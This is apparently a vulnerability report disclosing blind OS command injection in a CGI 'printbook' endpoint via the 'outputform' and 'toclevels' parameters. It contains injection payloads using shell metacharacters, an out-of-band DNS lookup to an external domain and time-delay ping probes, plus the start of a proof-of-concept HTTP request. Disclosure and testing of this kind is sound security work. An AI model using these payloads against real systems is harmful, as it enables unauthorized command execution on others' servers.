It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses , however it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain , to verify that a command was executed. The payload | nslookup -q=cname mytest.com.& was submitted in the parameters. The application performed a DNS lookup for the specified domain name. Additionally , the payload | ping -n 21 127.0.0.1 | `ping -c 21 127.0.0.1` # ' | ping -n 21 127.0.0.1 | `ping -c 21 127.0.0.1` # \\\" | ping -n 21 127.0.0.1 was submitted in the parameters. The application took 20960 milliseconds to respond to the request , compared with 1348 milliseconds for the original request. ， Affected URL :  ， Affected Paramenter : outputform , toclevels ， POC ， Request :  ， POST /cgi-bin/printbook HTTP/1.1 ， Host : 10.0.0.45 : 8457 ， User-Agent : Mozilla/5.0 ( X11 ; Linux x86_64 ; rv : 68.0 ) Gecko/20100101 Firefox/68.0",
